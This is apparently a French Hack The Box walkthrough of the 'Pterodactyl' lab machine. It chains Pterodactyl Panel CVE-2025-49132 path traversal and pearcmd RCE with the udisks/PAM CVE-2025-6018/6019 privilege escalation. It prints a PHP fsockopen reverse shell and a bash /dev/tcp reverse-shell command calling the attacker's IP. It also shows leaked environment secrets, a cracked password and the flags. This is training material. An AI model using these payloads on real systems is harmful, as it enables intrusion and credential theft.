@@ -1,0 +1,370 @@
+Nmap classique
+┌──(kali㉿kali)-[~/Documents/Pterodactyl]
+└─$ nmap -p- 10.129.9.21
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 09:53 -0500
+Nmap scan report for 10.129.9.21
+Host is up (0.017s latency).
+Not shown: 65063 filtered tcp ports (no-response), 468 filtered tcp ports (admin-prohibited)
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+443/tcp  closed https
+8080/tcp closed http-proxy
+
+Trois ports http (surement 2 sites différents)
+
+Je tombes sur la page d'accueil d'un serv minecraft, un sous-domaine play.pterodactyl.htb est présent (je l'ajoute a /etc/hosts)
+il y a un changelog.txt avec ecrit
+ [Installed] Pterodactyl Panel v1.11.10
+Je vais sur le github pour voir les CVE découverts dans les versions suivantes
+et je tombes sur 
+v1.11.11
+Fixed
+
+    Fixed CVE-2025-49132
+
+"Using the /locales/locale.json with the locale and namespace query parameters, a malicious actor is able to execute arbitrary code, without being authenticated.
+
+With the ability to execute arbitrary code, this vulnerability can be exploited in an infinite number of ways. It could be used to gain access to the Panel's server, read credentials from the Panel's config (.env or otherwise), extract sensitive information from the database (such as user details [username, email, first and last name, hashed password, ip addresses, etc]), access files of servers managed by the panel, etc."
+
+http://pterodactyl.htb/locales/locale.json me retourne un 404, je dois donc trouver où se situe le panel
+
+mon script trouve un panel.pterodactyl.htb
+┌──(kali㉿kali)-[~/Documents/Pterodactyl]
+└─$ subfinder pterodactyl.htb 3  
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://pterodactyl.htb
+ :: Wordlist         : FUZZ: /usr/share/wordlists/n0kovo_subdomains/n0kovo_subdomains_large.txt
+ :: Header           : Host: FUZZ.pterodactyl.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response words: 3
+________________________________________________
+
+panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 257ms]
+
+j'ajoutes au fichier hosts
+
+et effectivement http://panel.pterodactyl.htb/locales/locale.json existe bel et bien. il est mtn l'heure de me renseigner un peu plus sur l'exploit
+
+un git (https://github.com/Zen-kun04/CVE-2025-49132) me dit:
+ The attacker sends a GET request to /locales/locale.json, if the response returns you a JSON and the URL doesn't contain the parameter hash= then it's vulnerable to CVE-2025-49132.
+
+To exploit the vulnerability you have to use the parameters locale= and namespace= at the same time to read ONLY PHP FILES and you will get a JSON response with the variables stored in the PHP file you selected.
+
+For example: /locales/locale.json?locale=../../../pterodactyl&namespace=config/database
+
+je tentes donc http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database
+et effectivement je tombes sur "username":"pterodactyl","password":"PteraPanel"
+
+le changelog parlais de Enabled PHP-PEAR for PHP package management., donc on va l'utiliser pour creer un payload php
+
+<?php $sock=fsockopen("10.10.14.237",9333);$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>
+
+après pleins d'essais cette path pour pear semble réagir différement donc elle doit etre la
+locale=../../../../../usr/share/php/PEAR&namespace=pearcmd
+
+je modifie fortement un script trouvé sur internet (scripts/script.py) et après plusieurs tests je me rends compte que ce payload fonctionne 
+python ./exploit.py http://panel.pterodactyl.htb "exec 5<>/dev/tcp/10.10.14.237/9333;cat <&5 | while read line; do \$line 2>&5 >&5; done"
+
+env
+DB_PORT=3306
+LOG_DEPRECATIONS_CHANNEL=null
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+DB_HOST=127.0.0.1
+MAIL_PASSWORD=
+APP_ENVIRONMENT_ONLY=false
+PTERODACTYL_TELEMETRY_ENABLED=false
+MAIL_FROM_ADDRESS=no-reply@example.com
+APP_LOCALE=en
+HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
+APP_DEBUG=false
+LOG_LEVEL=debug
+MAIL_HOST=smtp.example.com
+USER=wwwrun
+REDIS_HOST=127.0.0.1
+APP_ENV=production
+PWD=/var/www/pterodactyl
+APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
+HOME=/var/lib/wwwrun
+DB_PASSWORD=PteraPanel
+HASHIDS_LENGTH=8
+MAIL_ENCRYPTION=tls
+APP_URL=http://panel.pterodactyl.htb
+MAIL_MAILER=smtp
+APP_TIMEZONE=UTC
+QUEUE_CONNECTION=redis
+CACHE_DRIVER=redis
+DB_USERNAME=pterodactyl
+SHLVL=1
+APP_SERVICE_AUTHOR=pterodactyl@pterodactyl.htb
+SESSION_DRIVER=redis
+DB_CONNECTION=mysql
+APP_THEME=pterodactyl
+RECAPTCHA_ENABLED=false
+MAIL_PORT=25
+MAIL_FROM_NAME=Pterodactyl Panel
+LOG_CHANNEL=daily
+MAIL_USERNAME=
+DB_DATABASE=panel
+_=/usr/bin/env
+OLDPWD=/var/www/pterodactyl/public
+
+je pensais qu'il y avait un lateral privesc avant l'user flag mais finalement il est dispo
+ls -la
+total 0
+drwxr-xr-x 1 root         root   46 Nov  7 18:41 .
+drwxr-xr-x 1 root         root  236 Jan  2 09:34 ..
+drwxr-x--- 1 headmonitor  users 140 Dec 31 17:29 headmonitor
+drwxr-xr-x 1 phileasfogg3 users 156 Dec 31 17:29 phileasfogg3
+cd phileasfogg3
+ls
+bin
+user.txt
+cat user.txt
+7de7934638e11d7c7d9ad0db3eb8f760
+
+j'upgrade mon shell avec revssh pour etre plus a l'aise
+j'explore la db
+mysql -h 127.0.0.1 -P 3306 -u pterodactyl -p panel
+je tombes sur ce hash que j'arrive a cracker
+$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
+on a donc l'user phileasfogg3:!QAZ2wsx
+ce mdp fonctionne pour se co en ssh
+
+phileasfogg3@pterodactyl:/tmp> cat /etc/systemd/system/wings.service 
+[Unit]
+Description=Pterodactyl Wings Daemon
+After=docker.service
+Requires=docker.service
+PartOf=docker.service
+
+[Service]
+User=root
+WorkingDirectory=/etc/pterodactyl
+LimitNOFILE=4096
+PIDFile=/var/run/wings/daemon.pid
+ExecStart=/usr/local/bin/wings
+Restart=on-failure
+StartLimitInterval=180
+StartLimitBurst=30
+RestartSec=5s
+
+[Install]
+WantedBy=multi-user.target
+
+
+Les systèmes Linux à risque pour lesquels le schéma d’attaque a été vérifié sont Ubuntu 24.04.1(Sudo 1.9.15p5,1.9.16p2) et
+je trouves ce CVE peut être applicable pour le sudo installé (Sudo 1.9.15p5)
+mais après un rapide check ça fonctionne pas.
+par contre je tombes sur un site interne sur le port 631 nomé cups, il y a peut être un vecteur a exploiter par là, je pourrais faire un tunnel http, mais j'ai grave kiffé la derniere fois que j'avais utilisé ligolo et ça me manque donc j'ai envie de retester
+en plus cups est lancé avec le root:
+root     17964  0.0  0.5  41032 10496 ?        Ss   14:06   0:00 /usr/sbin/cupsd -l
+
+je reprends sur un ancien writeup les steps 
+
+upload 
+scp /usr/share/ligolo-ng-common-binaries/ligolo-ng_agent_0.8.2_linux_amd64 phileasfogg3@pterodactyl.htb:/tmp/ligolo
+./ligolo -connect 10.10.14.237:8001 -ignore-cert
+
+pc local:
+./ligolo.exe -connect 10.10.14.20:8001 -ignore-cert
+
+interface_create --name "evil-cha"
+session (selectionner la session)
+tunnel_start --tun evil-cha
+interface_add_route --name evil-cha --route 240.0.0.1/32
+
+localhost dispo sur 240.0.0.1
+
+C'est bizarre au final j'ai pas les mêmes resultats avec ligolo et en faisant un curl local
+ligolo: 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML>
+<HEAD>
+        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
+        <TITLE>Bad Request - CUPS v2.2.7</TITLE>
+        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
+</HEAD>
+<BODY>
+<H1>Bad Request</H1>
+<P></P>
+</BODY>
+</HTML>
+
+peut être parcequ'il check si la requete est en localhost donc je me replie sur du tunelling ssh
+
+je vois que cups v2.2.7 est bien bien ancien, donc je recherche des CVE
+je trouves rien, un vieux CVE de 2024 sur lequel HTB a déjà fait une box
+
+je tombes sur ce mail
+
+phileasfogg3@pterodactyl:/var/mail> cat phileasfogg3 
+From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
+Delivered-To: phileasfogg3@pterodactyl
+Received: by pterodactyl (Postfix, from userid 0)
+id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
+From: headmonitor headmonitor@pterodactyl
+To: All Users all@pterodactyl
+Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
+Message-ID: 202511070915.headmonitor@pterodactyl
+Date: Fri, 07 Nov 2025 09:15:00 +0100
+MIME-Version: 1.0
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Attention all users,
+
+Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.
+
+Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.
+
+Report any signs of compromise immediately to headmonitor@pterodactyl.htb
+
+— HeadMonitor
+System Administrator
+
+je recherche ce que c'est udisks et je tombes sur udisks 2.9.2 sur le man, une version trèèès ancienne,
+en cherchant sur internet des cve je tombes sur cette page qui parle de privesc, bingo c'est pile ce que je veux
+https://ubuntu.com/blog/udisks-libblockdev-lpe-vulnerability-fixes-available
+
+je cite:
+CVE-2025-6018
+
+Qualys researchers discovered that some Linux distributions could allow an attacker, who logs in via ssh, to obtain the privileges of a physical (console) allow_active user. This attack is possible by using the pam_env.so module to set environment variables before the pam_systemd.so module is called, tricking pam_systemd.so into granting console privileges. In a default configuration, Ubuntu is not vulnerable to this issue as either the pam_env.so user_readenv option is not set, or pam_env.so is not located before the pam_systemd.so module invocation.
+
+If you have customized PAM configurations in your environment, please make sure they are not vulnerable. In particular, there should be no pam_env.so user_readenv=1 invocations before pam_systemd.so in any of the PAM stacks defined under /etc/pam.d/.
+
+CVE-2025-6019
+
+Qualys researchers analyzed the udisks daemon, which is installed by default on most Linux distributions. When making libblockdev calls, for example to resize an XFS filesystem, those are done without the nosuid and nodev flags. Through this, an attacker that is allowed to mount filesystems (which in default polkit configuration requires allow_active authorization, equivalent to physical console access) could copy into the victim’s machine an image, which contains a SUID-root shell and, by setting up a loop device with this image and requesting udisks to resize that filesystem, libblockdev would mount it in /tmp without the nosuid and nodev flags. The attacker can then execute their SUID-root shell and obtain full root privileges.
+
+In order to successfully carry out the exploit, the attacker would need to have mount privileges, which in the default polkit configuration require physical console access.
+
+La phrase de fin montre une chaine entre CVE-2025-6018 et CVE-2025-6019
+
+
+les exploits sont hors de mon niveau donc j'utilise
+https://github.com/ibrahmsql/CVE-2025-6018
+./CVE-2025-6018.py -i pterodactyl.htb -u phileasfogg3 -p '!QAZ2wsx'
+pour le premier exploit et
+https://github.com/guinea-offensive-security/CVE-2025-6019
+pour le deuxième
+je crée l'image xfs en local
+sudo ./exploit.sh              
+PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
+WARNING: Only run this on authorized systems. Unauthorized use is illegal.
+Continue? [y/N]: y
+[+] All dependencies are installed.
+[*] Checking for vulnerable libblockdev/udisks versions...
+[*] Detected udisks version: unknown
+[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.
+[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.
+[!] Continuing with PoC execution...
+Select mode:
+[L]ocal: Create 300 MB XFS image (requires root)
+[C]ible: Exploit target system
+[L]ocal or [C]ible? (L/C): l
+[*] Creating a 300 MB XFS image on local machine...
+300+0 records in
+300+0 records out
+314572800 bytes (315 MB, 300 MiB) copied, 0.0682236 s, 4.6 GB/s
+meta-data=./xfs.image            isize=512    agcount=4, agsize=19200 blks
+         =                       sectsz=512   attr=2, projid32bit=1
+         =                       crc=1        finobt=1, sparse=1, rmapbt=1
+         =                       reflink=1    bigtime=1 inobtcount=1 nrext64=1
+         =                       exchange=0   metadir=0
+data     =                       bsize=4096   blocks=76800, imaxpct=25
+         =                       sunit=0      swidth=0 blks
+naming   =version 2              bsize=4096   ascii-ci=0, ftype=1, parent=0
+log      =internal log           bsize=4096   blocks=16384, version=2
+         =                       sectsz=512   sunit=0 blks, lazy-count=1
+realtime =none                   extsz=4096   blocks=0, rtextents=0
+         =                       rgcount=0    rgsize=0 extents
+         =                       zoned=0      start=0 reserved=0
+[+] 300 MB XFS image created: ./xfs.image
+[*] Transfer to target with: scp xfs.image <user>@<host>:
+
+je l'envoie ensuite sur le serv:
+
+┌──(kali㉿kali)-[~/Documents/Pterodactyl/CVE-2025-6019]
+└─$ scp xfs.image phileasfogg3@pterodactyl.htb:/tmp
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+(phileasfogg3@pterodactyl.htb) Password: 
+xfs.image
+
+une fois sur le serv je rajoute /sbin a la path car c'est là que mkfs.xfs se situe
+export PATH=$PATH:/sbin
+
+puis je mount l'image avec la deuxieme partie de l'exploit
+
+exploit$ exploit$ ./exploit.sh
+./exploit.sh
+PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
+WARNING: Only run this on authorized systems. Unauthorized use is illegal.
+Continue? [y/N]: exploit$ y
+y
+[+] All dependencies are installed.
+[*] Checking for vulnerable libblockdev/udisks versions...
+[*] Detected udisks version: unknown
+[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.
+[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.
+[!] Continuing with PoC execution...
+Select mode:
+[L]ocal: Create 300 MB XFS image (requires root)
+[C]ible: Exploit target system
+[L]ocal or [C]ible? (L/C): exploit$ c
+c
+[*] Starting exploitation on target machine...
+[*] Checking allow_active status...
+[+] allow_active status confirmed.
+[*] Verifying xfs.image integrity...
+[*] Stopping gvfs-udisks2-volume-monitor...
+[*] Note: gvfs-udisks2-volume-monitor was not running.
+[*] Setting up loop device...
+[+] Loop device configured: /dev/loop0
+[*] Keeping filesystem busy to prevent unmounting...
+[+] Background loop started (PID: 14828)
+[*] Resizing filesystem to trigger mount...
+[+] Mount successful (expected error: target is busy).
+[*] Waiting 2 seconds for mount to stabilize...
+exploit$ id
+[*] Checking for SUID bash in /tmp/blockdev*...
+[+] SUID bash found: /tmp/blockdev.ZPP5J3/bash
+-rwsr-xr-x 1 root root 1380656 Feb 12 17:19 /tmp/blockdev.ZPP5J3/bash
+[*] Executing root shell...
+bash-5.3# id
+uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
+bash-5.3# exploit$ cd /root    
+-rwsr-xr-x 1 root root 1380656 Feb 12 17:19 /tmp/blockdev.ZPP5J3/bash
+cd /root
+bash-5.3# exploit$ ls 
+ls 
+bin  inst-sys  root.txt
+bash-5.3# exploit$ cat root.txt
+cat root.txt
+f67bbe3f9a65cf886103c629d98dfe4f
+bash-5.3# exploit$ 
+
+et BINGO j'ai le root et le root flag
+
+CONCLUSIONS:
+Tout m'a semblé assez rapide et évident, le premier exploit était facile à trouver, un peu plus compliqué a executé mais rien de bien complexe (d'ailleurs j'ai fait mon propre POC, chose que je fais rarement et que je devrais faire plus), une fois sur la machine j'ai eu mon seul bloquage quand j'ai pas reussi à trouver les mails qui donnaient des gros indices avant un bout de temps et que j'ai perdu du temps sur des rabitholes inutiles (sudo -l All (all), l'interface cups etc...) mais une fois le mail trouvé et les bons mots clés sur internet l'exploit à utiliser était évident, c'était un exploit plus compliqué à comprendre et impossible a scripter à mon niveau, mais d'anciens POC existaient déjà et je penses que le créateur de la box voulait qu'on les utilise car c'est une box niveau "MOYEN" et pas DIFFICILE ou HARDCORE.
+En gros j'ai trouvé ça assez directe et simple
